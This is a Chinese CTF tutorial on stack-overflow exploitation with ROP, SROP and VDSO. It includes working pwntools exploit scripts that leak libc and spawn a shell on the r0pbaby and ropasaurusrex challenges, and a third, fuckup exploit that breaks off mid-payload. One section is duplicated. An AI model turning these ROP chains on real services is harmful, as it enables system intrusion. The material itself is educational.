
# 【技术分享】现代栈溢出利用技术基础：ROP


                                阅读量   
                                **575624**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](./img/85831/t019f194b135178ee10.jpg)](./img/85831/t019f194b135178ee10.jpg)**

****

作者：[beswing](http://bobao.360.cn/member/contribute?uid=820455891)

预估稿费：400RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**栈与系统栈**

栈:一种先进后出的数据结构。常见操作有两种，进栈(PUSH) 和弹栈(POP),用于标识栈的属性有两个，一个是栈顶(TOP)，一个是栈底（BASE）

程序中的栈:

内存中的一块区域，用栈的结构来管理，从高地址向低地址增长

寄存器esp代表栈顶（即最低栈地址）

栈操作

压栈（入栈）push sth-&gt; [esp]=sth,esp=esp-4

弹栈（出栈）pop sth-&gt; sth=[esp],esp=esp+4

栈用于保存函数调用信息和局部变量

<br>

**函数调用**

如何通过系统栈进行函数的调用和递归



```
int fun_b(x,y){
int var_b1,var_b2;
rutrun var_b1 var_b2 ;
}
int fun_a(a,b){
int var_a;
var_a = fun_b(ab)
}
int main(int argc,chr argv,chr envp)
{
int var_main;
var_main = func_a{5,5};
rutrun var_main;
}
```

函数的分布应当是:

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015878b1f33774814a.png)

当CPU调用func_A函数，会从main函数对应的机器指令跳转到func_A，取值在执行，执行结束后，需要返回又会进行跳转…….以此类似的跳转过程。

**函数调用指令: call ret**

大致过程:

参数入栈

返回地址入栈

代码区块跳转

栈帧调整:

保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)；

将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)

给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)

相关指令:

Call func -&gt; push pc, jmp func

Leave -&gt;mov esp,ebp, pop ebp 

Ret -&gt; pop pc

**函数约定:**

```
* __stdcall，__cdecl，__fastcall，__thiscall，__nakedcall，__pascal
```

以 __fastcall为例子:



```
push  参数 3               #参数由右向左入栈
push 参数 2
push 参数 1
call 函数地址    #push当前指令位置，跳转到所调用函数的入口地址
push ebp         #保存旧栈帧的底部
mov ebp,esp    #设置新栈帧底部
sub esp ,xxx      #设置新栈帧顶部
```

参数传参:取决于调用约定，一般情况下:

X86 从右向左入栈，X64 优先寄存器，参数过多时才入栈



**寄存器**

重要的寄存器：rsp/esp, pc, rbp/ebp, rax/eax, rdi, rsi, rdx, rcx

ESP: 栈指针寄存器，内存存放着一个指针，指针指向系统栈最上面一个栈帧的底部

EBP:基址指针寄存器，存放着一个指针，指针指向系统栈最上面的一个栈帧底部

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e8b20fe6caa31658.jpg)

<br>

**堆栈溢出原理**

通俗的讲，栈溢出的原理就是不顾堆栈中分配的局部数据块大小，向该数据快写入了过多的数据，导致数据越界，结果覆盖来看老的堆栈数据。

<br>

**栈溢出的保护机制**

**栈上的数据无法被当作指令来执行**

数据执行保护(NX/DEP)

绕过方法ROP

**难以找到想要找的地址**

地址空间布局随机化(ASLR)

绕过方法:infoleak 、retdlresolve 、ROP

**检测栈数据是否被修改**

Stack Canary/ Cookie

绕过方法: infoleak

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b9be9878dadebed6.png)

<br>

**如今 计算机保护 基本上都是NX+Stack Canary +ASLR**

CTF 常用套路: 栈溢出的利用方法

现代栈溢出利用技术基础：ROP

利用signal机制的ROP技术：SROP

没有binary怎么办：BROP 、dump bin

劫持栈指针：stack pivot

利用动态链接绕过ASLR：ret2dl resolve、fake linkmap

利用地址低12bit绕过ASLR：Partial Overwrite

绕过stack canary：改写指针与局部变量、leak canary、overwrite canary

溢出位数不够怎么办：覆盖ebp，Partial Overwrite

现代栈溢出利用技术基础:ROP

讲道理学习ROP ，看蒸米的[文章](http://wooyun.bestwing.top:5000/search?keywords=rop&amp;content_search_by=by_drops)是最实在的。蒸米的一步一步学ROP简直是经典篇目。

ROP的基础学习可以看我翻译的一篇[文章](http://m.bobao.360.cn/learning/appdetail/3569.html)



**ROP题目分析**

承接上一个篇目，这里继续讲ROP的一些题目分析。讲真的，我这里基本上的题目以及攻击方式都来自于Atum师傅在X-MAN的PPT。

<br>

**CTF中ROP的常规套路**

第一次触发漏洞，通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)

直接execve(“/bin/sh”, [“/bin/sh”], NULL)，通常在静态链接时比较常用

三个练习:

Defcon 2015 Qualifier：R0pbaby

AliCTF 2016：vss

PlaidCTF 2013: ropasaurusrex

相关题目我们可以在[CTFs](https://github.com/ctfs/)上找到。

Defcon 2015 Qualifier：R0pbaby

我们拿到题目，可以先对题目进行检查，可先看看题目开启的保护



```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

gdb-peda 自带的 checksec 有检测程序是否开启保护，以及所开启的保护。我们可以看到，R0pbaby 所开启的保护有FORTIFY以及NX，这里我们主要所收到的限制是栈上写入的数据不可执行。

以及，程序可以知道是６４位的，它的传参优先由寄存器完成。

接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。

<br>

**尝试运行程序**

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014d1024e19069ac4a.png)

我们去尝试运行，摸清了基本上的程序的功能。

功能1，可以获得libc的基址

功能2，可以获得函数的地址

功能3，输入的地方，感觉这个地方可能存在漏洞。

紧接着，我们可以用IDA 分析程序了。

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01590f44261680b226.png)

发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。

<br>

**函数原型**

```
void memcpy(voiddest, const void * src, size_t n);
```

由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。

savedregs是一个IDA关键字，我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c89def1b6b1db525.png)

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0104e92b7ce8297a2c.png)

    <br>

buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：

我们需要找到一个gadget RDI 用来起shell

其次我们需要找到 "bin/sh"的地址

最后，我们需要找到system函数的地址

完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。

<br>

**如何找到 pop rdi**

我们需要找到:



```
pop rdi
ret
```

如此的指令，

我们可以通过简单的objdump来寻找简单的gadget



```
wings@sw:~/桌面/Rop$ python ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
Gadgets information
0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b5a23 : pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb11 : pop rbp ; pop r12 ; ret
0x000000000012bf16 : pop rbp ; pop r13 ; pop r14 ; ret
0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000ccb05 : pop rbp ; pop r14 ; pop rbp ; ret
0x00000000000202e6 : pop rbp ; pop r14 ; ret
0x000000000006d128 : pop rbp ; pop rbp ; ret
0x0000000000048438 : pop rbp ; pop rbx ; ret
0x000000000001f930 : pop rbp ; ret
0x00000000000ccb01 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret
0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b5a22 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret
0x000000000012bf15 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x000000000001f92f : pop rbx ; pop rbp ; ret
0x000000000002a69a : pop rbx ; ret
0x0000000000001b18 : pop rbx ; ret 0x2a63
0x0000000000185240 : pop rbx ; ret 0x6f9
0x000000000013c01f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000010134b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000000e9aba : pop rcx ; pop rbx ; ret
0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63
0x00000000000fc3e2 : pop rcx ; ret
0x0000000000020256 : pop rdi ; pop rbp ; ret
0x0000000000021102 : pop rdi ; ret
```

因为是本地测试，所以我先查看自己本地的libc.so.6

<br>

**确认libc.so.6**



```
wings@sw:~/桌面/Rop$ ldd r0pbaby
    linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)
    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7bd9000)
    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7810000)
    /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
wings@sw:~/桌面/Rop$ strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 18c177 /bin/sh
```

可以知道 偏移是0x18c177

至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.



```
system = 0x00007FFFF784F390 #get_libc_base()
rdi_gadget_offset = 0x21102
bin_sh_offset = 0x18c177
system_offset = 0x45390
from pwn import *
debug =1
if debug ==1:
  io = process("./r0pbaby")
else:
  io = remote("127.0.0.1",10002)
  #db.attach(io)
system = 0x00007FFFF784F390#get_libc_base()
rdi_gadget_offset = 0x21102
bin_sh_offset = 0x18c177
system_offset = 0x45390
libc_base = system - system_offset # system addr - system_offset = libc_base
print "[+] libc base: [%x]" % libc_base
rdi_gadget_addr = libc_base + rdi_gadget_offset
print "[+] RDI gadget addr: [%x]" % rdi_gadget_addr
bin_sh_addr = libc_base + bin_sh_offset
print "[+] "/bin/sh" addr: [%x]" % bin_sh_addr
system_addr = 0x00007FFFF784F390#get_libc_func_addr(h, "system")
print "[+] system addr: [%x]" % system_addr
payload = "A"*8
payload += p64(rdi_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
io.recv(1024)
io.sendline("3")
io.recv(1024)
io.send("%dn"%(len(payload)+1))
io.sendline(payload)
io.sendline("4")
io.interactive()
```

至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～

<br>

**PlaidCTF 2013: ropasaurusrex**

上一个程序简单的调用 system + "bin/sh" 通过寄存器 gadget "pop rdi;ret "传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。

依旧是老三套，我们先分析一下程序开启的保护。



```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

只开了NX 其他的都没开，我们可以应用ret2libc 的攻击方式来获取shell，所以我们得通过比如像write、puts、printf类似的函数做info leak用来计算system在内存中的地址。我们用IDA开，一边分析题目流程，一边找题目漏洞。



```
int __cdecl main()
{
  sub_80483F4();
  return write(1, "WINn", 4u);
}
sub_80483F4
ssize_t sub_80483F4()
{
  char buf; // [sp+10h] [bp-88h]@1
  return read(0, &amp;buf, 0x100u);
}
```

很清晰，我们可以看到题目流程非常简单，就读取一定字节，然后直接打印WINn。紧接着，我们可以看到read函数被错误使用，



```
.text:080483F2 ; ---------------------------------------------------------------------------
.text:080483F3                 align 4
.text:080483F4
.text:080483F4 ; =============== S U B R O U T I N E =======================================
.text:080483F4
.text:080483F4 ; Attributes: bp-based frame
.text:080483F4
.text:080483F4 sub_80483F4     proc near               ; CODE XREF: main+9p
.text:080483F4
.text:080483F4 buf             = byte ptr -88h
.text:080483F4
.text:080483F4                 push    ebp
.text:080483F5                 mov     ebp, esp
.text:080483F7                 sub     esp, 98h
.text:080483FD                 mov     dword ptr [esp+8], 100h ; nbytes
.text:08048405                 lea     eax, [ebp+buf]
.text:0804840B                 mov     [esp+4], eax    ; buf
.text:0804840F                 mov     dword ptr [esp], 0 ; fd
.text:08048416                 call    _read
.text:0804841B                 leave
.text:0804841C                 retn
.text:0804841C sub_80483F4     endp
.text:0804841C
.text:0804841
```

buf大小只有0x88,但是却允许被读入0x100的字节大小，这明显可以造成缓冲区溢出。



```
wings@sw:~/桌面/Rop$ file ./ropasaurusrex
./ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped
```

我们还知道的一点是，程序是32位，所以我们不需要像第一个题那样去找寄存器 gadget。

在main函数中有一个write函数，我们可以通过rop，来进行信息泄漏。所以攻击思大概是：

构造payload leak 内存中的一个函数地址，比如 read()

<br>

**计算libc base**

构造payload get shell



```
from pwn import *
debug = 1
elf = ELF('./ropasaurusrex')
if debug == 1:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
bof = 0x80483f4 # the vulnerable function
buffer_len = 0x88
context.log_level = 'debug'
#p = remote(args.host, args.port)
#p = process('./ropasaurusrex')
p = remote('127.0.0.1',10002)
payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(elf.symbols['write'])
payload += p32(bof)
payload += p32(1) # stdout
payload += p32(elf.got['read'])
payload += p32(4) # len
p.send(payload)
resp = p.recvn(4)
read = u32(resp)
libc_base = read - libc.symbols['read']
payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(libc_base + libc.symbols['system'])
payload += 'AAAA' # cont
payload += p32(libc_base + next(libc.search('/bin/sh')))
p.send(payload)
p.sendline('ls')
p.interactive()
```

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e7814784d24c499f.png)

至此 一个简单的64位程序 ROP Pwn题完成！！撒花　撒花～

<br>

**PlaidCTF 2013: ropasaurusrex**

上一个程序简单的调用 system + "bin/sh" 通过寄存器 gadget "pop rdi;ret "传参起shell，接着我们来完成第二个pwn，第二个pwn的特点是，我们需要去info leak 得到信息，然后计算system 的地址。

依旧是老三套，我们先分析一下程序开启的保护。



```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

只开了NX 其他的都没开，我们可以应用ret2libc 的攻击方式来获取shell，所以我们得通过比如像write、puts、printf类似的函数做info leak用来计算system在内存中的地址。我们用IDA开，一边分析题目流程，一边找题目漏洞。



```
int __cdecl main()
{
  sub_80483F4();
  return write(1, "WINn", 4u);
}
sub_80483F4
ssize_t sub_80483F4()
{
  char buf; // [sp+10h] [bp-88h]@1
  return read(0, &amp;buf, 0x100u);
}
```

很清晰，我们可以看到题目流程非常简单，就读取一定字节，然后直接打印WINn。紧接着，我们可以看到read函数被错误使用，



```
.text:080483F2 ; ---------------------------------------------------------------------------
.text:080483F3                 align 4
.text:080483F4
.text:080483F4 ; =============== S U B R O U T I N E =======================================
.text:080483F4
.text:080483F4 ; Attributes: bp-based frame
.text:080483F4
.text:080483F4 sub_80483F4     proc near               ; CODE XREF: main+9p
.text:080483F4
.text:080483F4 buf             = byte ptr -88h
.text:080483F4
.text:080483F4                 push    ebp
.text:080483F5                 mov     ebp, esp
.text:080483F7                 sub     esp, 98h
.text:080483FD                 mov     dword ptr [esp+8], 100h ; nbytes
.text:08048405                 lea     eax, [ebp+buf]
.text:0804840B                 mov     [esp+4], eax    ; buf
.text:0804840F                 mov     dword ptr [esp], 0 ; fd
.text:08048416                 call    _read
.text:0804841B                 leave
.text:0804841C                 retn
.text:0804841C sub_80483F4     endp
.text:0804841C
.text:0804841
```

buf大小只有0x88,但是却允许被读入0x100的字节大小，这明显可以造成缓冲区溢出。



```
wings@sw:~/桌面/Rop$ file ./ropasaurusrex
./ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped
```

我们还知道的一点是，程序是32位，所以我们不需要像第一个题那样去找寄存器 gadget。

在main函数中有一个write函数，我们可以通过rop，来进行信息泄漏。所以攻击思大概是：

构造payload leak 内存中的一个函数地址，比如 read()

计算libc base

构造payload get shell



```
from pwn import *
debug = 1
elf = ELF('./ropasaurusrex')
if debug == 1:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
bof = 0x80483f4 # the vulnerable function
buffer_len = 0x88
context.log_level = 'debug'
#p = remote(args.host, args.port)
#p = process('./ropasaurusrex')
p = remote('127.0.0.1',10002)
payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(elf.symbols['write'])
payload += p32(bof)
payload += p32(1) # stdout
payload += p32(elf.got['read'])
payload += p32(4) # len
p.send(payload)
resp = p.recvn(4)
read = u32(resp)
libc_base = read - libc.symbols['read']
payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(libc_base + libc.symbols['system'])
payload += 'AAAA' # cont
payload += p32(libc_base + next(libc.search('/bin/sh')))
p.send(payload)
p.sendline('ls')
p.interactive()
```

小结一下：

read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 – 链接、装载与库》这本书）

**上面的内容来自蒸米 -一步一步 rop**

做了两个简单的rop 第一个的64位，第二个是32位，基本上 也能体会到两者的区别了，一者是寄存器传参，一者是栈传参。至于AliCTF的vsvs ，我没找到Bin程序，所以这里就不单独分析了。我们看看别人的wp，例如链接[https://segmentfault.com/a/1190000005718685](https://segmentfault.com/a/1190000005718685) 

下一个内容准备学习 VROP，一种利用signal机制的ROP技术。



**SROP**

最近出现SROP的题目，就是XCTF -NJCTF中的 [Pwn300-233](http://bobao.360.cn/ctf/learning/188.html)

当然，虽然出题人是这么出的，但是也还是有非预期做法的。比如Joker师傅的针对这个题目的强行解决方案，强行猜libc base 然后暴力跑，用ROP 解决。

那么 SROP是什么，与普通的ROP有什么区别呢?我们可以开始学习了。

<br>

**什么是SROP**

SROP: Sigreturn Oriented Programming 系统Signal Dispatch之前会将所有寄存器压入栈，然后调用signal handler，signal handler返回时会将栈的内容还原到寄存器。 如果事先填充栈，然后直接调用signal handler，那在返回的时候就可以控制寄存器的值。

首先，我们得先了解一下signal的调用流程，那么我就能大概了解SROP的利用原理。

正如mctrain，在他的[《Sigreturn Oriented Programming (SROP) Attack攻击原理》](http://www.freebuf.com/articles/network/87447.html)文章里所提到的，当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0117d092e2235109a7.png)

在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。

那么，我们是如何利用这个系统调用来做一些不可告人的事情的呢？

在singnal中可以说是，有两个层次，一个是用户，一个是内核层次，我们也可以将这个过程简单的看作。



```
User code
singnal handler
sigreturn
```

如果在mctrain文章中看懂了，signal的调用流程，那么我们就可以讲讲，如何去利用攻击，即我们可以讲讲他的攻击流程。

<br>

**攻击流程**

注： 以下图片内容均来自[https://www.slideshare.net/AngelBoy1/sigreturn-ori](https://www.slideshare.net/AngelBoy1/sigreturn-ori)   的PDF 

当内核发起signal

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0141b3d4e8e345ec48.png)

这个时候，我们可以看到栈还并未没push数据，以及ip仍然在User code上。

将数据push到栈中时

将sigreturn syscall的位置 push 进栈

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0119d092afe1b7b124.png)

紧接着程序流程跳转至signal handler

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015b8bf7b09cb2e55b.png)

从signal handler 返回

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ef5592ed296cd118.png)

然后流程又跳转至 sigreturn code

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0144f930fa69063fba.png)

执行 singreturn syscall

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01abf777a77be05ea0.png)

stack 即栈上的内容全部 pop 回register ，流程又重新回到 user code

[![](./img/85831/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d72dbab913415bff.png)

至此，我们基本完成了攻击，我们可以大概总结下，

我们需要的攻击条件

第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；

第二，需要知道栈的地址（比如需要知道自己构造的字符串/bin/sh的地址）；

第三，需要知道syscall指令在内存中的地址；

第四，需要知道sigreturn系统调用的内存地址。

当然，更详细的，如利用SROP构造系统调用串（System call chains）依旧可以从mctrain，在他的[《Sigreturn Oriented Programming (SROP) Attack攻击原理》](http://www.freebuf.com/articles/network/87447.html)文章找到，我们这里的重点并不是SROP，而是做SROP CTF题。

SROP构造，及攻击流程概括的来讲就是：

伪造sigcontext 结构，push进stack中

设置ret address在sigreturn syscall的gadget

将signal fram中的rip(eip)设置在syscall（int 0x80)

当sigreturn返回时，就可以执行syscall

需要说明的是sigretrun gadget的寻找是有前人总结的

**x86**

vdso 正常的 syscall handler也会使用的

**x64**

kernel &lt;3.3

vsyscall (0xffffffff600000) &lt;= 位置一直固定

kernel &gt;= 3.3

libc &lt;= 普通的syscall hander也会使用

<br>

**VDSO**

了解了一下SROP，我们接下来可以再来学习一下什么是VDSO，以及如何直接利用VDSO做ROP

VDSO(Virtual Dynamically-linked Shared Object)是个很有意思的东西, 它将内核态的调用映射到用户态的地址空间中, 使得调用开销更小, 路径更好.

开销更小比较容易理解, 那么路径更好指的是什么呢? 拿x86下的系统调用举例, 传统的int 0x80有点慢, Intel和AMD分别实现了sysenter, sysexit和syscall, sysret, 即所谓的快速系统调用指令, 使用它们更快, 但是也带来了兼容性的问题. 于是Linux实现了vsyscall, 程序统一调用vsyscall, 具体的选择由内核来决定. 而vsyscall的实现就在VDSO中.

Linux(kernel 2.6 or upper)环境下执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO. 例如:



```
wings@sw:~$ ldd /bin/sh
    linux-vdso.so.1 =&gt;  (0x00007ffee4bd1000)
    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5e19e56000)
    /lib64/ld-linux-x86-64.so.2 (0x0000557ef5001000)
wings@sw:~$
```



**为什么要用VDSO 来做ROP？**

在X86系统中，传统的system call:int 0x80并不是由很好的效果的，因此在intel 新型的cpu提供了新的syscall指令。

**sysenter**

**sysexit**

（Linux kernel 》= 2.6后的版本支持新型syscall机制）

VDSI可以降低在传统的 int 0x80的overhead 以及提供了sigreturn 方便在signal handler结束后返回到user code

如何利用 VDSO 做ROP

我们需要知道 sysenter其参数传递方式和int 0x80是一样的，但是我们需要事前自己做好funcion prolog

```
push ebp;mov ebp,sp
```

以及需要一个 “A good gadgaet for stack pivot”，因为如果没做function prolog可以利用ebp去改变stack位置

<br>

**Retrun to vDSO**

如何找到vdso 地址?

基本上里利用方法就是：

要么暴力解决

利用 信息泄露 即我们所受的information leak

使用ld.so _libc_stack_end找到 stack其实位置，计算ELF Auxiliary vector offset 并从中取出AT_SYSINFO_EHDR

使用ld.so中的_rtld_global_ro的某个offset也有vdso的位置。

我们需要尤其注意的是在开了ASLR的情况下，VDSO的利用是有一定优势的

在x86环境下：

只有一个字节是随机的，所以我们可以很容易暴力解决

在x64环境下

在开启了pie的情形 有 11字节是随机的 例如：CVE-2014-9585

但是在linux kernel 3.182.2版本之后，这个已经增加到了18个字节的随机

<br>

**重头戏来了：Defcon 2015 Qualifier fuckup**

题目可以在这里下载： [this](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/fuckup)

我们照旧来分析程序：

**总体上来说**

程序应该是开启了ASLR 的，每次    

用户执行命令时，FUCKUP会根据类似于WELL512的生成算法生成的随机数，改变二进制映射的存储器的基址。

当我们运行程序时，可以看到有一个菜单



```
$ ./fuckup
Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.
This app is to help prove the benefits of F.U.C.K.U.P.
Main Menu
---------
1. Display info
2. Change random
3. View state info
4. Test stack smash
-------
0. Quit
```

当运行函数，以及反编译程序之后，我们可以了解程序功能。

当我们选择功能2的时候，“App moved to new random location”，text段和stack会被修改，重新指向新的内存地址

当我们选择3的时候，会告诉我们最后一个随机数(其当前determienstextbase)再次随机化text。这可以用于PRNG的预测

选项4：



```
Input buffer is 10 bytes in size. Accepting 100 bytes of data.
This will crash however the location of the stack and binary are unknown to stop code execution
```

我们在功能3找到一个mmap 地址映射函数：



```
change_random(sub_80481A6)
do
  {
    seedf = randf_state_(a1) * 4294967295.0;
    seedl = (signed __int64)seedf;
    expect = (void *)(seedl &amp; 0xFFFFF000);
    actual = mmap(v3, 0x804CA6C, v2, a1, a2, 0);
  }
  while ( (seedl &amp; 0xFFFFF000) != actual );
```

所以寻常的思路，我们基本是做不了了

大概是这样的，做了不一样的地址映射，所以其实这个题目还是要回归于VDSO以及SROP。

思路如下：

32位下vdso 只有1字节是随机的，我们这里可以brute force然后利用其gadget

可以直接利用overflow return address，只有100个字节

先利用vdso的gadget做出read sys call 并加大input的大小

read 读入的内容放到tls

tls位置在vdso前一个page

使用sysenter 将stack 换到tls段

然后，我们在第二次输入的时候 可以将 /bin/sh 放入到tls段，这里要注意但是，这个时候tls已经在栈了

紧接着，我们sigreturn gadget 以及 fack signal frame一并放进，然后可以直接execve执行 /bin/sh

进行循环，知道成功getshell

最后的exp，我没能搞定，这里可以参考 hastebin.com的脚本



```
#!/usr/bin/env python3
def read_until(socket, x):
    data = b""
    while True:
        data += socket.recv(4096)
        if x in data:
            break
        if not data:
            raise RuntimeError("no data after: %s" % data)
    return data
def skip(socket, x):
    print(read_until(target, x).decode("utf8"))
    print("=======")
if __name__ == '__main__':
    import os
    import sys
    import time
    import struct
    import socket
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()
    target = socket.socket()
    target.connect((args.host, args.port))
    input("Are you ready? This is the time to attach gdb and stuff.")
    skip(target, b"Quit")
    target.send(b"4n")
    skip(target, b"execution")
    # We partially overwrite the return address, we need to comeup
    # with valid-in-the-future values for ebx and ebp.
    payload = b"a" * 14
    payload += struct.pack("&lt;I", 0x3e1b7a6c)    # ebx / computed
    payload += struct.pack("&lt;I", 0x3e1b8000)    # ebp # must only be valid r/w
    payload += b"x14" # re-trigger init with known/constant random_seed, provided by esi.
    # Make sure we don't send too much at once.
    target.send(payload)
    time.sleep(1)
    todo = 100 - len(payload)
    while todo &gt; 0:
        sending = min(10, todo)
        target.send(b"a" * (sending - 1) + b"n")
        time.sleep(0.2)
        todo = todo - sending
        print(".", end="", flush=True)
    print()
    print("Sent first stage, waiting for menu.")
    skip(target, b"Quit")
    target.send(b"4n")
    skip(target, b"execution")
    print("Sending exploit.")
    def get_addr(addr, name):
        """Get runtime addr from ida addr."""
        ida_base = 0x8048000
        # It seems under xinetd there is one more call to prng().
        # Not sure why this is but we just have to check what
        # value will be generated and use that.
        # run_base = 0x39d54000 # local no xinetd
        run_base = 0xfe97c000 # local with xinetd
        ret = addr + (run_base - ida_base)
        print("%s will be at %#.8x" % (name, ret))
        return ret
    def pack_addr(addr, name):
        return struct.pack("&lt;I", get_addr(addr, name))
    payload = b"a" * 14
    payload += struct.pack("&lt;I", 0x42424242)    # base
    payload += struct.pack("&lt;I", 0x42424242)    # ebp
    # This is so we can ironically expect a F.U.C.K.U.P.
    payload += pack_addr(0x080483C0, "welcome")
    # Setup syscall. ebx, ecx, edx. eax=11
    payload += pack_addr(0x0804908f, "pop eax; pop ebx; pop esi; ret")
    payload += struct.pack("&lt;I", 11)            # execv
